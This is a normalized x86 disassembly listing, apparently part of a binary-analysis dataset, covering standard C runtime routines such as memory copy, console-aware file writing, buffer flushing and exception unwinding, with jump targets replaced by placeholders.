mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_10015589
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_10015648
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_100156cf
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_100156cf
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_10015648
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_100157b2
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_10010a80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_100112b2
mov [ eax ] esi
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000fe6e
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_100112b2
xor esi esi
mov [ eax ] esi
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100186f2
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_10018756
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_10013426
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_1001129f
mov [ eax ] 0x1c
call sub_100112b2
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_100112c5
pop ecx
jmp r-xdata
call sub_1001129f
mov [ eax ] 0x9
call sub_100112b2
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_100141c1
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_100184fc
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_100186d8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_100186d8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_100184fc
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_10015ee5
push 0x10
push r--data
call sub_10012000
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_100112b2
and [ eax ] 0x0
call sub_1001129f
mov [ eax ] 0x9
call sub_100112b2
mov [ eax ] edi
call sub_1001129f
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10013956
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10012045
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100188d8
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1001129f
mov [ eax ] 0x9
call sub_100112b2
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100157b2
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10015fb7
mov eax [ ebp - 0x1c ]
sub_10015fc1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_10015ff3
push 0x10
push r--data
call sub_10012000
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_1001129f
mov [ eax ] 0x9
call sub_1001129f
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10013956
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10012045
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100188d8
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1001129f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_10018861
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100160ca
mov eax [ ebp - 0x1c ]
call sub_100112b2
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_100160d4
push 0x10
push r--data
call sub_10012000
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_10011508
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001616a
mov eax [ ebp - 0x1c ]
call sub_10012045
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_10018a16
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_1000fe7d
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_10016180
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_10016222
push 0x10
push r--data
call sub_10012000
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10012045
retn
sub_10016290
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10016318 ]
jmp [ ecx * 4 + jump_table_10016398 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10016404 ]
pop esi
pop edi
pop ebp
jmp sub_100156cf
jmp [ ecx * 4 + jump_table_100165a0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_100164a4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100165a0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10016404 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100165a0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10016404 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10016404 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10016404 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100165a0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100165a0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100165a0 ]
sub_100165f8
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10016688
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10018ba9
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10018bc8
jmp r-xdata
sub_10016688
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_1000fe6e
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_100165f8
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100166ea
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1001671a
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1001674b
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_10013122
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_100167d4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_10016818
push 0x20
push r--data
call sub_10012000
xor edi edi
